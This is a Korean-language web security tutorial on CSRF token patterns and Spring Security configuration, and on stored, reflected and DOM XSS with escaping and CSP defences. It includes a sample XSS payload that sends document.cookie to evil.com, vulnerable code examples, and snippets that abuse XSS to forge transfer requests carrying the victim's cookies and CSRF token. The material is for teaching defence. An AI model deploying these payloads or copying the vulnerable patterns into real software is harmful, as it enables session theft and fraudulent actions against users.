
## A. CSRF 토큰

### A-1. CSRF 토큰이 왜 필요한가

앞에서 짚었던 것처럼 SameSite만으로는 구멍이 있다.

```
SameSite=Strict/Lax → form 제출 CSRF는 막음
SameSite=None       → form 제출 CSRF 뚫림
서브도메인 공격      → 같은 루트 도메인이면 SameSite 우회 가능
```

그리고 구형 브라우저는 SameSite를 지원하지 않는다.

CSRF 토큰의 핵심 아이디어는 단순하다.

```
"서버만 알고 있는 값을 요청에 포함시켜라.
evil.com은 그 값을 알 수 없으니 위조 요청을 만들 수 없다."
```

### A-2. CSRF 토큰 동작 원리

```
1. 사용자가 페이지를 로드할 때 서버가 토큰을 발급
2. 토큰을 페이지에 포함 (hidden input 또는 응답 헤더)
3. 요청 시 토큰을 함께 전송
4. 서버가 토큰 검증
```

evil.com이 위조 요청을 만들려면 이 토큰 값을 알아야 한다.  
SOP 때문에 evil.com의 JS는 다른 출처의 응답을 읽을 수 없다.  
→ 토큰을 알 수 없다 → 위조 요청 불가.

### A-3. 토큰 전달 패턴 두 가지

**패턴 1: Double Submit Cookie**

```
서버가 CSRF 토큰을 쿠키로 내려줌 (HttpOnly 아님)
클라이언트가 쿠키 값을 읽어서 요청 헤더에도 포함

요청:
Cookie: XSRF-TOKEN=abc123        ← 자동으로 붙음
X-XSRF-TOKEN: abc123             ← JS가 쿠키 읽어서 헤더에 직접 추가

서버: 두 값이 일치하는지 확인
```

evil.com은 SOP 때문에 쿠키를 읽을 수 없다.  
헤더에 올바른 토큰 값을 넣을 수 없으므로 위조 불가.

**패턴 2: Synchronizer Token**

```
서버가 세션에 토큰 저장
HTML 응답에 hidden input으로 포함

<input type="hidden" name="_csrf" value="abc123">

요청 시 이 값을 함께 전송
서버가 세션의 토큰과 비교
```

### A-4. Spring Security CSRF 구현

Spring Security는 기본으로 CSRF 보호가 활성화되어 있다.

```java
// Spring Security 6.x 기본 동작
// 별도 설정 없어도 CSRF 보호 활성화됨
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // withHttpOnlyFalse: JS가 쿠키를 읽을 수 있게 (Double Submit 패턴)
        );
    return http.build();
}
```

`CookieCsrfTokenRepository`는 Double Submit Cookie 패턴을 구현한다.

```
서버 응답:
Set-Cookie: XSRF-TOKEN=abc123; Path=/   ← HttpOnly 아님 (JS가 읽어야 하니까)

React:
import axios from 'axios';
// Axios는 XSRF-TOKEN 쿠키를 자동으로 읽어서
// X-XSRF-TOKEN 헤더에 붙여준다 (기본 동작)
axios.post('/api/transfer', data);
// → Cookie: XSRF-TOKEN=abc123
// → X-XSRF-TOKEN: abc123  ← Axios가 자동으로 추가
```

fetch를 직접 쓴다면 수동으로 해야 한다.

```javascript
// fetch는 CSRF 토큰 자동 처리 안 함
function getCookie(name) {
    return document.cookie
        .split('; ')
        .find(row => row.startsWith(name + '='))
        ?.split('=')[1];
}

fetch('/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': getCookie('XSRF-TOKEN')  // 직접 읽어서 붙임
    },
    body: JSON.stringify(data)
});
```

### A-5. SameSite + CSRF 토큰 조합

```
SameSite=Strict  → CSRF 토큰 없어도 강력한 방어
                   단, 교차 출처 쿠키 전송 불가 (로그인 유지 등 UX 제약)

SameSite=Lax     → 대부분의 CSRF 막음
                   단, 일부 엣지케이스 존재 (GET으로 상태 변경하는 경우)

SameSite=None    → CSRF 토큰 필수
                   교차 출처 쿠키 허용하므로 form CSRF 뚫림
```

실무에서는 **SameSite=Lax + CSRF 토큰** 조합을 많이 쓴다.  
둘 다 있으면 하나가 뚫려도 다른 하나가 막아준다.

---

## B. XSS 공격과 방어

### B-1. XSS가 뭔가 — 어떻게 스크립트가 심어지는가

XSS(Cross-Site Scripting)는 공격자의 스크립트가  
**피해자의 브라우저에서 실행**되는 공격이다.

**Stored XSS — DB에 저장된 악성 스크립트**

```
공격자가 게시판에 글을 씀:
제목: 안녕하세요
내용: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

서버가 이걸 그대로 DB에 저장.
피해자가 그 게시글을 보면:
→ 브라우저가 <script> 태그를 실행
→ 쿠키가 evil.com으로 전송
```

**Reflected XSS — URL 파라미터가 그대로 출력되는 경우**

```
https://search.example.com?q=<script>악성코드</script>

서버가 검색어를 그대로 HTML에 출력:
<p>검색 결과: <script>악성코드</script></p>

→ 이 URL을 피해자에게 클릭하게 유도
→ 피해자 브라우저에서 스크립트 실행
```

**DOM XSS — 서버를 거치지 않고 JS가 직접 DOM에 삽입**

```javascript
// 취약한 코드
const query = location.hash.slice(1);  // URL의 # 뒤 값
document.getElementById('result').innerHTML = query;
// → https://example.com#<img src=x onerror=악성코드>
// → 서버 응답과 무관하게 브라우저에서 바로 실행
```

React를 쓰면 `innerHTML`을 직접 쓰는 일이 줄어들지만,  
`dangerouslySetInnerHTML`을 쓰면 동일한 취약점이 생긴다.

```jsx
// 취약한 React 코드
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### B-2. HttpOnly + CSRF 토큰을 XSS로 우회하는 방법

앞에서 짚었던 것처럼 XSS가 뚫리면 둘 다 우회 가능하다.

**HttpOnly 쿠키 우회**

```javascript
// 쿠키를 못 읽어도 직접 요청을 보낸다
// 브라우저가 알아서 쿠키를 붙여주니까

fetch('https://api.example.com/transfer', {
    method: 'POST',
    credentials: 'include',  // HttpOnly 쿠키도 자동으로 붙음
    body: JSON.stringify({ to: 'attacker', amount: 1000000 })
})
```

**CSRF 토큰 우회**

```javascript
// XSRF-TOKEN 쿠키는 HttpOnly가 아님 (JS가 읽어야 하니까)
// XSS로 읽은 다음 요청에 포함

const csrfToken = getCookie('XSRF-TOKEN');  // 읽힘
fetch('https://api.example.com/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: { 'X-XSRF-TOKEN': csrfToken },  // 토큰도 포함
    body: JSON.stringify({ to: 'attacker', amount: 1000000 })
})
```

XSS가 뚫린 순간 공격자는 피해자의 브라우저를 완전히 제어한다.  
CSRF 토큰도, HttpOnly도 의미가 없어진다.

### B-3. XSS 근본 방어 — 입력값 검증과 이스케이프

**서버 측 출력 이스케이프**

```java
// 취약한 코드
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // 그대로 넘김
    return "search";
}

// 템플릿 (Thymeleaf)
// th:text는 자동 이스케이프 → 안전
<p th:text="${query}">...</p>

// th:utext는 이스케이프 안 함 → 위험
<p th:utext="${query}">...</p>
```

**React는 기본으로 이스케이프한다**

```jsx
// 안전 — React가 자동으로 이스케이프
const userInput = '<script>악성코드</script>';
return <div>{userInput}</div>;
// → 화면에 텍스트로 표시됨. 실행 안 됨.

// 위험 — 이스케이프 안 함
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

### B-4. CSP (Content Security Policy)

XSS의 근본 방어선이다.  
"이 페이지에서는 어떤 출처의 스크립트만 실행 가능하다"를 브라우저에 선언한다.

```
서버 응답 헤더:
Content-Security-Policy: default-src 'self'; script-src 'self'
```

```
'self' → 같은 출처의 스크립트만 허용

공격자가 심은 인라인 스크립트:
<script>악성코드</script>
→ CSP가 차단. 실행 안 됨.

외부 스크립트:
<script src="https://evil.com/hack.js"></script>
→ evil.com은 허가 목록에 없음. 차단.
```

Spring Security에서 CSP 설정:

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self'; " +
            "style-src 'self' https://fonts.googleapis.com; " +
            "img-src 'self' data: https:; " +
            "connect-src 'self' https://api.example.com"
        )
    )
);
```

**CSP가 잃는 것**

인라인 스크립트를 전부 막으면 레거시 코드나 서드파티 라이브러리가 깨질 수 있다.  
`'unsafe-inline'`을 허용하면 CSP 효과가 크게 줄어든다.  
nonce 기반으로 허용된 인라인만 실행하는 방식으로 절충한다.

```
Content-Security-Policy: script-src 'self' 'nonce-랜덤값'

<script nonce="랜덤값">이건 허용</script>
<script>이건 차단</script>
```

nonce는 요청마다 서버가 새로 발급한다.  
공격자는 nonce 값을 모르니까 인라인 스크립트를 심어도 실행이 안 된다.

---

## 정리

```
CSRF 방어 레이어:
  1순위: SameSite=Lax/Strict (쿠키 레벨)
  2순위: CSRF 토큰 (요청 레벨)
  둘 다 있으면 하나가 뚫려도 다른 하나가 막음

XSS 방어 레이어:
  1순위: 입력값 이스케이프 (근본 방어)
  2순위: CSP (실행 차단)
  3순위: HttpOnly (쿠키 탈취 방어, XSS 자체는 못 막음)

XSS가 뚫리면:
  HttpOnly → 우회 가능 (직접 요청)
  CSRF 토큰 → 우회 가능 (쿠키 읽어서 포함)
  CSP → 가장 강력하게 버텨줌
```

---

## 이어지는 개념

1. **Spring Security 필터 체인** — CSRF 토큰 검증, CORS, 인증이 어떤 순서로 처리되는지. 설정이 안 먹히는 원인 대부분이 필터 순서에 있다.
    
2. **JWT vs 세션 쿠키 보안 비교** — XSS/CSRF 관점에서 어떤 방식이 어떤 공격에 취약한지. localStorage JWT는 XSS에 완전히 노출되고, HttpOnly 쿠키 세션은 CSRF에 노출된다. 트레이드오프를 구체적으로 비교.